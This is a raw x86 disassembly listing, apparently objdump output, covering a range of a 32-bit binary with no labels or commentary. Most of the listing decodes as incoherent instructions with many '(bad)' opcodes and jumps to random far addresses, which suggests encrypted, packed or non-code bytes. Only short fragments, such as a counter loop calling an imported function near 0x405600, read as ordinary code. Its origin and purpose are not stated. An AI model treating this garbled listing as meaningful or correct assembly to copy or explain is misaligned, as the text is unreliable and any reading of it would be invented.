  4050cb:	sub    eax,DWORD PTR [ecx-0x45]
  4050ce:	jae    0x40510c
  4050d0:	sub    bl,dl
  4050d2:	(bad)  
  4050d3:	sbb    edi,DWORD PTR [edx]
  4050d5:	fidivr DWORD PTR [edx+0x6c6f99aa]
  4050db:	cmp    dh,BYTE PTR [eax+0x69]
  4050de:	mul    DWORD PTR [ebx]
  4050e0:	mov    DWORD PTR [ecx-0x3f],ecx
  4050e3:	mov    ebx,0x3fc35089
  4050e8:	std    
  4050e9:	xor    al,0xfa
  4050eb:	mov    esi,0x500d868d
  4050f0:	rcl    BYTE PTR [eax-0x4978ac36],1
  4050f6:	popa   
  4050f7:	bound  esp,QWORD PTR [edx]
  4050f9:	inc    edi
  4050fa:	or     al,0x75
  4050fc:	inc    esp
  4050fd:	pandn  mm7,QWORD PTR [esi+ebp*2-0x38341feb]
  405105:	idiv   esp
  405107:	ins    DWORD PTR es:[edi],dx
  405108:	or     al,0xb9
  40510a:	xchg   edx,eax
  40510b:	dec    edx
  40510c:	dec    esp
  40510d:	loop   0x4050dc
  40510f:	mov    bl,0x52
  405111:	dec    ecx
  405112:	mov    ecx,0x54d59f95
  405117:	sbb    eax,0x44b8d381
  40511c:	fisubr WORD PTR [eax+0x7b]
  40511f:	adc    ebx,DWORD PTR [ebp+0x1df5d589]
  405125:	les    esi,FWORD PTR [edi-0x214ddcb]
  40512b:	fbld   TBYTE PTR [ebx+0x67]
  40512e:	sbb    eax,0x9662bc16
  405133:	(bad)
  405136:	test   eax,0x2f25bdcd
  40513b:	leave  
  40513c:	fcom   st(3)
  40513e:	shl    bl,0x7c
  405141:	enter  0xeb5c,0x98
  405145:	mov    ds:0xfe5b526d,al
  40514a:	test   eax,0x2c162e48
  40514f:	enter  0x339c,0x33
  405153:	fild   DWORD PTR [edi+0x7a4a0521]
  405159:	jmp    0x4051ab
  40515b:	cli    
  40515c:	lahf   
  40515d:	(bad)  
  40515e:	fisttp QWORD PTR [esi]
  405160:	mov    ecx,DWORD PTR [edx]
  405162:	cmp    al,0x47
  405164:	sub    BYTE PTR [edi+0x2267e9ff],0xba
  40516b:	ret    
  40516c:	dec    ebp
  40516d:	sahf   
  40516e:	mov    edx,0x43039ce6
  405173:	(bad)  
  405174:	and    eax,0x1590e58e
  405179:	ja     0x40513f
  40517b:	stos   DWORD PTR es:[edi],eax
  40517c:	clc    
  40517d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40517e:	int3   
  40517f:	test   eax,0x50d74faf
  405184:	push   ebx
  405185:	mov    BYTE PTR [edx-0x68f7ac4a],0xe2
  40518c:	iret   
  40518d:	std    
  40518e:	ja     0x4051f3
  405190:	inc    ebp
  405191:	shr    ebx,cl
  405193:	popa   
  405194:	mov    WORD PTR [ebp+0x22ddd30a],?
  40519a:	jmp    0x405171
  40519c:	imul   esp,esi,0xfc5ac02f
  4051a2:	mov    ds:0x3462b6ee,al
  4051a7:	inc    esi
  4051a8:	xlat   BYTE PTR ds:[ebx]
  4051a9:	mov    ds:0xc5f256df,al
  4051ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051af:	repz lahf 
  4051b1:	jno    0x4051ea
  4051b3:	fs test bh,dh
  4051b6:	lahf   
  4051b7:	jl     0x405202
  4051b9:	out    dx,al
  4051ba:	ss ins BYTE PTR es:[edi],dx
  4051bc:	jmp    0x14c5:0xa267622f
  4051c3:	mov    cl,0x50
  4051c5:	inc    edi
  4051c6:	dec    esi
  4051c7:	and    DWORD PTR [edx-0x7e],edi
  4051ca:	dec    esp
  4051cb:	ja     0x4051b2
  4051cd:	mov    eax,0x341d0f86
  4051d2:	fmul   QWORD PTR [edi]
  4051d4:	adc    ch,ch
  4051d6:	daa    
  4051d7:	push   ebx
  4051d8:	sub    DWORD PTR [edx],0xffffffa9
  4051db:	or     BYTE PTR [ecx-0x4b],0xeb
  4051df:	inc    ebp
  4051e0:	and    eax,0x651ed2d2
  4051e5:	jbe    0x4051a6
  4051e7:	inc    eax
  4051e8:	mov    al,ds:0x24d70c04
  4051ed:	shl    BYTE PTR [ebx+eax*4],1
  4051f0:	retf   0x5f89
  4051f3:	mov    ds:0x481a5ae2,eax
  4051f8:	add    ch,BYTE PTR [edi+0x5d]
  4051fb:	pusha  
  4051fc:	or     ah,BYTE PTR [ebx+edi*1-0x2a]
  405200:	cmp    BYTE PTR [edx-0x7b7236b0],bh
  405206:	adc    BYTE PTR [edx-0x76ffcd8e],bl
  40520c:	inc    ebp
  40520d:	or     bh,bh
  40520f:	inc    ebp
  405210:	or     al,0xe9
  405212:	and    edx,edi
  405214:	(bad)  
  405215:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  40521b:	mov    ecx,DWORD PTR [ebp+0x10]
  40521e:	add    eax,esi
  405220:	mov    DWORD PTR [ecx],eax
  405222:	pop    esi
  405223:	leave  
  405224:	ret    0xc
  405227:	push   ebp
  405228:	mov    ebp,esp
  40522a:	jmp    0x4055fe
  40522f:	or     DWORD PTR ds:0x369d361d,0xffffffa3
  405236:	mov    ebp,0x424146fc
  40523b:	mov    ebp,0xd0abf720
  405240:	sub    bh,BYTE PTR [esp+edi*2-0x4b]
  405244:	jns    0x4052c2
  405246:	jl     0x405200
  405248:	cmp    dh,ch
  40524a:	pop    ebp
  40524b:	out    0x70,eax
  40524d:	gs popf 
  40524f:	in     al,dx
  405250:	rcr    cl,cl
  405252:	add    al,0x7a
  405254:	(bad)  
  405255:	push   esi
  405256:	push   ds
  405257:	(bad)  
  405258:	stc    
  405259:	mov    ebx,0x253dc5f0
  40525e:	imul   eax,DWORD PTR ds:0xb818106a,0xefa41b3c
  405268:	sbb    cl,BYTE PTR [eax]
  40526a:	cmc    
  40526b:	ss pop ss
  40526d:	sar    DWORD PTR [esi-0x5b],1
  405270:	cwde   
  405271:	push   ds
  405272:	hlt    
  405273:	and    eax,0x3197c065
  405278:	(bad)  
  405279:	sub    edx,DWORD PTR [edx-0x1f7a62d5]
  40527f:	add    bl,cl
  405281:	xchg   ebp,eax
  405282:	push   0xffffffcc
  405284:	out    dx,al
  405285:	cmc    
  405286:	mov    ds:0xf40a060,al
  40528b:	es (bad) 
  40528d:	mov    esi,0x39c26dbf
  405292:	push   es
  405293:	(bad)  
  405294:	adc    esp,esi
  405296:	sub    cl,dl
  405298:	mov    al,ds:0x4e50d5b5
  40529d:	int3   
  40529e:	loope  0x4052fc
  4052a0:	out    dx,al
  4052a1:	rol    DWORD PTR [edi],1
  4052a3:	or     DWORD PTR [esi-0x20],0xffffffb2
  4052a7:	mov    eax,0x577e2dd4
  4052ac:	fstp   st(0)
  4052ae:	mov    ecx,DWORD PTR [esi]
  4052b0:	mov    esi,0x15572b63
  4052b5:	or     esi,DWORD PTR [ecx]
  4052b7:	lock mov edi,0x971c7d74
  4052bd:	mov    edx,DWORD PTR [edi-0x78]
  4052c0:	dec    edi
  4052c1:	stos   BYTE PTR es:[edi],al
  4052c2:	js     0x405341
  4052c4:	test   BYTE PTR [esi],al
  4052c6:	in     al,dx
  4052c7:	ds xchg edi,eax
  4052c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052ca:	in     al,dx
  4052cb:	sub    ah,BYTE PTR [esi+ebp*8+0x48]
  4052cf:	dec    ebp
  4052d0:	lods   al,BYTE PTR ds:[esi]
  4052d1:	xor    al,0xa7
  4052d3:	adc    BYTE PTR [eax+eax*8],bh
  4052d6:	sbb    al,0x8d
  4052d8:	inc    eax
  4052d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052da:	cwde   
  4052db:	mov    edx,0xd913f077
  4052e0:	test   eax,0x581c9b71
  4052e5:	repz pop ebx
  4052e7:	iret   
  4052e8:	cmp    DWORD PTR [eax-0x66],0x7b
  4052ec:	not    DWORD PTR ds:0x7e04936a
  4052f2:	mov    bl,0x40
  4052f4:	inc    esp
  4052f5:	mov    bl,0x8f
  4052f7:	sub    dl,0x48
  4052fa:	shr    DWORD PTR ds:0x2688a349,1
  405300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405301:	xchg   ebp,eax
  405302:	stos   BYTE PTR es:[edi],al
  405303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405304:	xor    BYTE PTR [esi-0x4c22151e],dl
  40530a:	inc    edx
  40530b:	test   BYTE PTR [ecx-0x10],cl
  40530e:	push   ebp
  40530f:	inc    esi
  405310:	and    al,BYTE PTR [ebx+0x4]
  405313:	sbb    DWORD PTR [edi+0x3d0b3409],0x5b5d9dd
  40531d:	pop    ecx
  40531e:	pop    esp
  40531f:	shl    DWORD PTR [esi-0xe],1
  405322:	fldenv [ecx-0x4a25ded2]
  405328:	call   0x909afe8c
  40532d:	sbb    esp,DWORD PTR [ebx-0x3c]
  405330:	loope  0x40536e
  405332:	rcl    BYTE PTR [edi-0x36ef4af0],cl
  405338:	into   
  405339:	gs xor eax,0xaf4b1e98
  40533f:	mov    bp,0xc37b
  405343:	sbb    BYTE PTR [edx-0x599c9816],ah
  405349:	xlat   BYTE PTR ds:[ebx]
  40534a:	retf   0x5328
  40534d:	adc    BYTE PTR [eax+0x33dfd701],dh
  405353:	arpl   WORD PTR [esi+ecx*4-0x6afc0cbb],sp
  40535a:	out    dx,al
  40535b:	ret    0x7e5d
  40535e:	iret   
  40535f:	mov    DWORD PTR [edi+0x74],edi
  405362:	push   ss
  405363:	jg     0x405345
  405365:	in     eax,dx
  405366:	dec    eax
  405367:	dec    ecx
  405368:	repnz arpl si,sp
  40536b:	das    
  40536c:	cdq    
  40536d:	aaa    
  40536e:	jns    0x40538c
  405370:	and    DWORD PTR [ebp-0x7],eax
  405373:	stc    
  405374:	jl     0x40538f
  405376:	sti    
  405377:	jmp    0x5d80:0xe9263183
  40537e:	out    dx,al
  40537f:	xchg   edx,eax
  405380:	or     bh,BYTE PTR [esi-0x5d8f30f6]
  405386:	or     esi,edi
  405388:	and    eax,0x3a1dbfe4
  40538d:	push   0x56cec5d7
  405392:	mov    bh,0x8
  405394:	sti    
  405395:	lods   al,BYTE PTR ds:[esi]
  405396:	scas   eax,DWORD PTR es:[edi]
  405397:	push   ss
  405398:	push   ss
  405399:	je     0x405347
  40539b:	dec    eax
  40539c:	add    al,0x2a
  40539e:	jae    0x4053b4
  4053a0:	call   0xcf449590
  4053a5:	jnp    0x4053e0
  4053a7:	cli    
  4053a8:	dec    edx
  4053a9:	sbb    eax,0x8502887f
  4053ae:	and    ch,BYTE PTR [ebp+0x4d]
  4053b1:	dec    esi
  4053b2:	(bad)  
  4053b3:	stos   BYTE PTR es:[edi],al
  4053b4:	xchg   esp,eax
  4053b5:	mul    eax
  4053b7:	jnp    0x405420
  4053b9:	jno    0x4053d5
  4053bb:	outs   dx,DWORD PTR ds:[esi]
  4053bc:	fistp  DWORD PTR [esi-0x2c]
  4053bf:	push   edi
  4053c0:	sub    eax,0x50ead7c8
  4053c5:	sahf   
  4053c6:	jne    0x4053fb
  4053c8:	shl    BYTE PTR [ebx+eax*4+0x40],1
  4053cc:	mov    esi,0x2a00d9d8
  4053d1:	(bad)  
  4053d2:	pop    ebp
  4053d3:	cmp    DWORD PTR [edx],0x34
  4053d6:	imul   ecx,edx,0xffffffc9
  4053d9:	push   0xd97de23b
  4053de:	mov    esp,0xae25870b
  4053e3:	shl    DWORD PTR [eax+0x24],cl
  4053e6:	cdq    
  4053e7:	push   ds
  4053e8:	pop    ss
  4053e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053ea:	cmp    BYTE PTR [edx-0x46],0x2
  4053ee:	iret   
  4053ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053f0:	push   esi
  4053f1:	test   DWORD PTR [eax],edi
  4053f3:	in     eax,0xab
  4053f5:	dec    ebp
  4053f6:	xor    eax,0x26fce58c
  4053fb:	mov    ds:0xd3a536ef,eax
  405400:	pop    esi
  405401:	enter  0xdc3b,0xab
  405405:	ucomiss xmm3,xmm5
  405408:	cmp    BYTE PTR [ebx+0x4d],cl
  40540b:	cli    
  40540c:	shl    BYTE PTR ds:0xff6ba9f2,0xdf
  405413:	inc    edx
  405414:	sub    DWORD PTR [ecx],0xffffffeb
  405417:	sub    esi,DWORD PTR [ecx+0x29dc792e]
  40541d:	sbb    cl,ah
  40541f:	test   DWORD PTR ds:0x7eb7ce12,ebp
  405425:	fs mov esp,0xbe3c6bf4
  40542b:	call   0xc1afd70f
  405430:	test   eax,0xbbcc3e99
  405435:	mov    bh,0x14
  405437:	fimul  WORD PTR [edi-0x6e]
  40543a:	add    eax,0xc87c4b4e
  40543f:	test   eax,0x1a94e572
  405444:	popa   
  405445:	hlt    
  405446:	fsub   QWORD PTR cs:[ebx-0x41]
  40544a:	pushf  
  40544b:	das    
  40544c:	(bad)  
  40544d:	push   edx
  40544e:	loopne 0x4054b5
  405450:	sbb    ebx,DWORD PTR [eax]
  405452:	cmp    eax,0xfa4b0a68
  405457:	in     al,dx
  405458:	mov    BYTE PTR [ecx-0x4772ee2c],0x13
  40545f:	das    
  405460:	fstp   TBYTE PTR [esi-0x4d]
  405463:	xorps  xmm3,XMMWORD PTR [ecx-0x39f49fe7]
  40546a:	stc    
  40546b:	jmp    0x80148a9
  405470:	aam    0xd7
  405472:	add    esi,esp
  405474:	xor    BYTE PTR [ebp+0x47],0xf5
  405478:	outs   dx,BYTE PTR ds:[esi]
  405479:	sti    
  40547a:	(bad)  
  40547b:	xor    BYTE PTR [esp+esi*8+0x58],0xb0
  405480:	pop    edx
  405481:	mov    al,ds:0x5d5e93c5
  405486:	ja     0x405432
  405488:	xchg   ebp,eax
  405489:	xchg   esi,eax
  40548a:	in     eax,0x90
  40548c:	fsubrp st(3),st
  40548e:	jle    0x4054e3
  405490:	cld    
  405491:	mov    eax,es:0x5d7e53a3
  405497:	mov    BYTE PTR [eax+0x7e230178],ah
  40549d:	fucomp st(5)
  40549f:	lods   al,BYTE PTR ds:[esi]
  4054a0:	inc    ebp
  4054a1:	enter  0x3b0d,0x4c
  4054a5:	xchg   edx,eax
  4054a6:	packssdw mm5,QWORD PTR [ebp+0x7b96351e]
  4054ad:	fs into 
  4054af:	add    eax,0xa0f64043
  4054b4:	shl    BYTE PTR [edi-0x48],1
  4054b7:	xchg   ecx,eax
  4054b8:	xchg   BYTE PTR [esi+0x292d4a9f],ah
  4054be:	lock xchg ebp,eax
  4054c0:	stos   BYTE PTR es:[edi],al
  4054c1:	ret    0x258b
  4054c4:	and    dh,ah
  4054c6:	pop    ebp
  4054c7:	inc    eax
  4054c8:	inc    edx
  4054c9:	ins    DWORD PTR es:[edi],dx
  4054ca:	xor    DWORD PTR [eax-0x7312a108],esp
  4054d0:	jne    0x405455
  4054d2:	mov    dl,0xe0
  4054d4:	pop    ebx
  4054d5:	or     DWORD PTR [ecx+ebx*2+0x42],esp
  4054d9:	mov    cl,0xe5
  4054db:	xor    al,0x10
  4054dd:	test   BYTE PTR [ecx-0x4d],bh
  4054e0:	sbb    ah,BYTE PTR [ebx]
  4054e2:	ret    0xfe56
  4054e5:	xchg   ebp,eax
  4054e6:	xor    eax,0x4ac0ae2b
  4054eb:	addr16 sub eax,0xd7d086d1
  4054f1:	cmp    edx,DWORD PTR [eax]
  4054f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054f4:	xchg   DWORD PTR [ebx+0x67b8c117],ebp
  4054fa:	jl     0x4054d6
  4054fc:	retf   0x73ca
  4054ff:	int    0x9a
  405501:	and    ah,BYTE PTR [esi+eax*4+0x34]
  405505:	jae    0x405512
  405507:	jmp    0x405569
  405509:	jp     0x4054e3
  40550b:	test   DWORD PTR [edx-0x3ff9d19f],ebx
  405511:	ds scas eax,DWORD PTR es:[edi]
  405513:	call   0xb6c1:0x8a4238af
  40551a:	inc    ebx
  40551b:	add    al,0x87
  40551d:	stos   BYTE PTR es:[edi],al
  40551e:	in     al,0xd1
  405520:	xor    ah,BYTE PTR [edi-0xf]
  405523:	dec    edi
  405524:	scas   eax,DWORD PTR es:[edi]
  405525:	gs stc 
  405527:	cli    
  405528:	or     DWORD PTR ds:0xd42532d2,edi
  40552e:	in     al,dx
  40552f:	nop
  405530:	rcr    DWORD PTR ds:0x5fdd440a,cl
  405536:	pop    esp
  405537:	mov    DWORD PTR ds:[ebx+edi*4],edi
  40553b:	ret    
  40553c:	push   es
  40553d:	mov    eax,0x22612a41
  405542:	xchg   ch,ah
  405544:	mov    edi,0xb09c772
  405549:	adc    al,0xed
  40554b:	inc    esp
  40554c:	retf   0xc2e1
  40554f:	pop    ecx
  405550:	sbb    al,0x66
  405552:	adc    BYTE PTR [edi+0x6f],ch
  405555:	xlat   BYTE PTR ds:[ebx]
  405556:	fimul  WORD PTR [ecx-0x50]
  405559:	test   al,0xd
  40555b:	mov    bl,0x66
  40555d:	xor    BYTE PTR [edi+0x3a32678e],0xbb
  405564:	sub    eax,0xa930a08c
  405569:	sbb    DWORD PTR [ecx+0x2e],edi
  40556c:	mov    ah,bl
  40556e:	mov    dh,0xc8
  405571:	mov    DWORD PTR cs:[edx+0x6e],esi
  405575:	or     cl,dl
  405577:	jnp    0x405580
  405579:	pushf  
  40557a:	or     BYTE PTR [esi+eax*1-0x31],ch
  40557e:	xchg   DWORD PTR [edx+0x70c85d27],esp
  405584:	cmp    al,0x78
  405586:	xchg   dh,al
  405588:	lea    esp,[eax+ebx*4]
  40558b:	push   es
  40558c:	imul   esp,DWORD PTR [edi],0xffffffae
  40558f:	loope  0x405585
  405591:	mov    edi,esi
  405593:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  405595:	sti    
  405596:	cmp    ebx,DWORD PTR [ebx+0x3d]
  405599:	scas   eax,DWORD PTR es:[edi]
  40559a:	inc    esp
  40559b:	in     al,dx
  40559c:	out    dx,al
  40559d:	xor    al,0xd2
  40559f:	pop    ebp
  4055a0:	xchg   edi,eax
  4055a1:	mov    ch,0x4e
  4055a3:	test   eax,0x5dd4d574
  4055a8:	mov    WORD PTR [eax+0x3f],ds
  4055ab:	pavgw  mm2,mm0
  4055ae:	jg     0x405589
  4055b0:	adc    al,0x99
  4055b2:	push   ebx
  4055b3:	sahf   
  4055b4:	jg     0x4055eb
  4055b6:	add    BYTE PTR [esi],dh
  4055b8:	mov    eax,0xbad5f0e2
  4055bd:	out    0x5f,al
  4055bf:	retf   
  4055c0:	call   0x87f5:0x272e9e29
  4055c7:	push   ebx
  4055c8:	sbb    dh,BYTE PTR ss:[edi+0x508dce52]
  4055cf:	ficom  WORD PTR [ebx+0x5b]
  4055d2:	dec    ebx
  4055d3:	cmp    eax,0xc09bb359
  4055d8:	hlt    
  4055d9:	inc    BYTE PTR [edi+0x5c16599f]
  4055df:	push   edx
  4055e0:	mov    edx,esi
  4055e2:	push   0x8776d800
  4055e7:	ins    DWORD PTR es:[edi],dx
  4055e8:	in     al,dx
  4055e9:	push   edi
  4055ea:	add    ah,BYTE PTR [edi+eax*8+0x73]
  4055ee:	call   0x72d9:0x5ef7db0a
  4055f5:	std    
  4055f6:	gs ret 
  4055f8:	pop    ds
  4055f9:	int    0x9
  4055fb:	imul   edi,DWORD PTR [ebx+0x61],0x51
  4055ff:	push   ecx
  405600:	and    DWORD PTR ds:0x4335e3,0x0
  40560a:	mov    eax,ds:0x4335e3
  40560f:	inc    eax
  405610:	mov    ds:0x4335e3,eax
  405615:	cmp    DWORD PTR ds:0x4335e3,0x4
  40561c:	jne    0x405630
  405622:	push   0x6994
  405627:	push   DWORD PTR [ebp-0xc]
  40562a:	call   DWORD PTR ds:0x412254
  405630:	cmp    DWORD PTR ds:0x4335e3,0x3
  405637:	jne    0x405648
  40563d:	mov    eax,ds:0x4335e3
  405642:	inc    eax
  405643:	mov    ds:0x4335e3,eax
  405648:	cmp    DWORD PTR ds:0x4335e3,0x12
  40564f:	jb     0x40560a
  405655:	sbb    edx,ecx
  405657:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40565e:	jmp    0x405a32
  405663:	xchg   ecx,eax
  405664:	dec    ebx
  405665:	xor    eax,0xbd71fd91
  40566a:	dec    ebx
  40566b:	rcl    DWORD PTR [esi+0x1d],1
  40566e:	push   esi
  40566f:	xor    BYTE PTR [edi+ecx*1],dh
  405672:	dec    edx
  405673:	or     DWORD PTR [esi],esi
  405675:	jl     0x4056f3
  405677:	mov    ch,0x79
  405679:	jl     0x4056f7
  40567b:	stos   BYTE PTR es:[edi],al
  40567c:	out    0x9e,al
  40567e:	je     0x4056c6
  405680:	jecxz  0x405621
  405682:	popa   
  405683:	in     al,dx
  405684:	ja     0x4056e7
  405686:	add    dl,BYTE PTR [eax+edx*8]
  405689:	inc    edi
  40568a:	iret   
  40568b:	pop    ecx
  40568c:	mov    al,ds:0x33f95c10
  405691:	jmp    0xc452a5a4
  405696:	lods   eax,DWORD PTR ds:[esi]
  405697:	out    0xb9,eax
  405699:	pushf  
  40569a:	jno    0x40565e
  40569c:	jb     0x405685
  40569e:	fimul  DWORD PTR [esi]
  4056a0:	pop    edx
  4056a1:	fs mov bh,0x13
  4056a4:	sbb    DWORD PTR [ebx],esp
  4056a6:	(bad)  
  4056a7:	imul   ebx,DWORD PTR [eax+0x66453ff1],0x6e
  4056ae:	loopne 0x40569b
  4056b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056b1:	pop    ebx
  4056b2:	add    bh,ch
  4056b4:	rol    ch,1
  4056b6:	data16 arpl WORD PTR [edx-0x11930fd9],ax
  4056bd:	jmp    0x40564a
  4056bf:	jbe    0x405671
  4056c1:	jp     0x4056ae
  4056c3:	ret    0xf6a4
  4056c6:	les    edx,FWORD PTR [edx]
  4056c8:	inc    esp
  4056c9:	repnz stc 
  4056cb:	fld    QWORD PTR [eax]
  4056cd:	push   esi
  4056ce:	pop    esi
  4056cf:	mov    eax,0xafc4ccb4
  4056d4:	mov    dh,0x13
  4056d6:	in     al,0x85
  4056d8:	pop    ds
  4056d9:	push   ebp
  4056da:	std    
  4056db:	dec    edi
  4056dc:	imul   ebp,ecx,0xc0237856
  4056e2:	ins    BYTE PTR es:[edi],dx
  4056e3:	sub    eax,0x3a63c3d5
  4056e8:	test   BYTE PTR [edi+0xc],0xf3
  4056ec:	bound  ebp,QWORD PTR [ecx-0x79]
  4056ef:	imul   ebx,ebx,0xffffffbe
  4056f2:	sbb    DWORD PTR [eax+edx*4-0x39],edi
  4056f6:	xchg   ebp,eax
  4056f7:	inc    esi
  4056f8:	nop
  4056f9:	hlt    
  4056fa:	cmp    al,0x1
  4056fc:	ret    0xb91a
  4056ff:	sub    BYTE PTR [ecx-0x4e],0xae
  405703:	shl    DWORD PTR [esi],cl
  405705:	stos   BYTE PTR es:[edi],al
  405706:	mov    esp,0x714bf23e
  40570b:	push   ecx
  40570c:	repz ror DWORD PTR [edx-0x27],0xc1
  405711:	nop
  405712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405713:	(bad)  
  405714:	sub    dl,BYTE PTR [ebx]
  405716:	lods   al,BYTE PTR ds:[esi]
  405717:	lds    edi,FWORD PTR [eax-0x50]
  40571a:	out    0x9d,al
  40571c:	rol    BYTE PTR [edx-0x12],cl
  40571f:	add    eax,0x7cac36b6
  405724:	dec    esi
  405725:	lea    esp,[esi+0x77fccc68]
  40572b:	cld    
  40572c:	or     BYTE PTR [eax],cl
  40572e:	mov    cs,eax
  405730:	adc    edx,DWORD PTR [esi+0xe]
  405733:	out    0x2a,eax
  405735:	dec    edx
  405736:	mov    bh,BYTE PTR [ecx-0x69]
  405739:	fs sub eax,0xad41fc08
  40573f:	daa    
  405740:	(bad)  
  405741:	(bad)  
  405742:	mov    ecx,0x2e0baa11
  405747:	imul   esp,ebp,0xd4d3a85b
  40574d:	(bad)  
  40574e:	push   ebx
  40574f:	add    DWORD PTR [edi+0x7c5efb97],esi
  405755:	hlt    
  405756:	es stos BYTE PTR es:[edi],al
  405758:	jle    0x40579b
  40575a:	pop    edi
  40575b:	mov    esi,0x61510a6c
  405760:	mov    al,ds:0x8a5f3057
  405765:	enter  0x797c,0x95
  405769:	mov    ebx,0xdb2971fd
  40576e:	jp     0x40575f
  405770:	jmp    0xd98:0x40e7cb24
  405777:	popf   
  405778:	cmp    al,0xc9
  40577a:	pop    ss
  40577b:	pusha  
  40577c:	hlt    
  40577d:	ror    edi,0xa6
  405780:	jbe    0x4057d5
  405782:	and    eax,0xecfe6d29
  405787:	mov    ss,WORD PTR [ebx]
  405789:	cwde   
  40578a:	call   0xb949:0xb387eea6
  405791:	(bad)  
  405793:	mov    ah,0x3b
  405795:	(bad)  
  405796:	lds    edx,FWORD PTR [ebx]
  405798:	and    ebx,DWORD PTR [eax+0x8]
  40579b:	push   edx
  40579c:	lods   eax,DWORD PTR ds:[esi]
  40579d:	push   esi
  40579e:	mov    esp,0xc41bd9df
  4057a3:	retf   0x3766
  4057a6:	mov    esp,0xb831150a
  4057ab:	xor    esi,ebx
  4057ad:	push   es
  4057ae:	imul   DWORD PTR cs:[ebx+0x1effa3b7]
  4057b5:	lods   al,BYTE PTR ds:[esi]
  4057b6:	(bad)  
  4057b8:	fcomp  DWORD PTR [ebx]
  4057ba:	gs sahf 
  4057bc:	lds    ecx,FWORD PTR [ecx-0x42]
  4057bf:	je     0x405754
  4057c1:	push   edx
  4057c2:	sar    DWORD PTR [eax],0x49
  4057c5:	shr    esp,cl
  4057c7:	out    dx,eax
  4057c8:	js     0x405840
  4057ca:	outs   dx,DWORD PTR ds:[esi]
  4057cb:	pop    esp
  4057cc:	xor    ah,dh
  4057ce:	idiv   DWORD PTR [eax]
  4057d0:	mov    al,ds:0xc113e43c
  4057d5:	pop    edx
  4057d6:	and    eax,DWORD PTR [edi+eiz*8-0x37445106]
  4057dd:	lds    ecx,FWORD PTR [edi-0x5c]
  4057e0:	jle    0x4057d7
  4057e2:	xchg   DWORD PTR [ebp+0x61],ebx
  4057e5:	gs scas eax,DWORD PTR es:[edi]
  4057e7:	push   ebp
  4057e8:	xchg   ecx,eax
  4057e9:	mov    ds:0x895765aa,al
  4057ee:	ret    
  4057ef:	xor    eax,0x7762d46f
  4057f4:	push   cs
  4057f5:	jae    0x405844
  4057f7:	mov    cl,BYTE PTR [edx+0x7a]
  4057fa:	inc    edx
  4057fb:	mov    cl,0xc8
  4057fd:	sub    cl,BYTE PTR [ecx-0x79d2fb39]
  405803:	mov    eax,ds:0x1447f87b
  405808:	pushf  
  405809:	inc    ebx
  40580a:	and    DWORD PTR [ebx+esi*8-0x11739699],0xffffffc7
  405812:	test   DWORD PTR [esi+esi*1],edx
  405815:	sar    edx,cl
  405817:	mov    bl,0x5e
  405819:	push   ebp
  40581a:	inc    edx
  40581b:	popa   
  40581c:	sbb    eax,0xa38c8d0d
  405821:	loop   0x4057f1
  405823:	aam    0x62
  405825:	scas   al,BYTE PTR es:[edi]
  405826:	sbb    ecx,edi
  405828:	int3   
  405829:	push   ecx
  40582a:	ds pop esp
  40582c:	or     BYTE PTR [edi-0x14],0xa0
  405830:	ds ret 0x722a
  405834:	lods   al,BYTE PTR ds:[esi]
  405835:	fld    DWORD PTR [esi]
  405837:	mov    ebp,0x882e759e
  40583c:	je     0x4057bf
  40583e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40583f:	fstp   st(4)
  405841:	push   0xffffffd7
  405843:	adc    ebx,DWORD PTR [esi+esi*4-0x7658c199]
  40584a:	add    eax,0x954190ac
  40584f:	fcmovb st,st(3)
  405851:	sbb    cl,BYTE PTR ds:0xc3ffa81b
  405857:	aad    0x26
  405859:	pop    ds
  40585a:	cld    
  40585b:	out    dx,al
  40585c:	inc    ebp
  40585d:	rcl    bh,1
  40585f:	mov    ds:0x5db18090,eax
  405864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405865:	(bad)
  405869:	xor    DWORD PTR [edi],0x3eab1fb7
  40586f:	sbb    eax,0x16a6b934
  405874:	hlt    
  405875:	xor    cl,BYTE PTR [ebp-0x3a]
  405878:	inc    edi
  405879:	push   esp
  40587a:	retf   0xc32d
  40587d:	arpl   WORD PTR [ebx-0x9],dx
  405880:	lods   eax,DWORD PTR ds:[esi]
  405881:	sub    eax,0x547d9010
  405886:	(bad)  
  405887:	mov    eax,0x883345d0
  40588c:	aas    
  40588d:	daa    
  40588e:	xchg   ecx,eax
  40588f:	ins    DWORD PTR es:[edi],dx
  405890:	(bad)
  405893:	dec    esp
  405894:	in     al,dx
  405895:	and    ah,BYTE PTR [edx+edx*2]
  405898:	push   0x9f20cfec
  40589d:	jecxz  0x4058a5
  40589f:	gs sbb eax,0x576d6b03
  4058a5:	fcom   st(7)
  4058a7:	clc    
  4058a8:	xchg   ebp,eax
  4058a9:	hlt    
  4058aa:	dec    esp
  4058ab:	out    dx,eax
  4058ac:	push   0xffffffe1
  4058ae:	repz inc edx
  4058b0:	in     al,dx
  4058b1:	inc    esp
  4058b2:	js     0x4058c8
  4058b4:	stos   BYTE PTR es:[edi],al
  4058b5:	cwde   
  4058b6:	(bad)  
  4058b7:	fmul   DWORD PTR [ebx+0x1d7ff1b]
  4058bd:	pop    edi
  4058be:	jge    0x4058bd
  4058c0:	ds cmp al,0x17
  4058c3:	outs   dx,DWORD PTR ds:[esi]
  4058c4:	loope  0x405846
  4058c6:	or     bh,BYTE PTR [edi-0x6f85216d]
  4058cc:	push   esp
  4058cd:	sbb    BYTE PTR [ebx-0x12],cl
  4058d0:	cld    
  4058d1:	inc    edi
  4058d2:	lds    ebp,FWORD PTR [ebx]
  4058d4:	ret    
  4058d5:	pop    ebp
  4058d6:	test   BYTE PTR [edi+0x9],dh
  4058d9:	jnp    0x4058a5
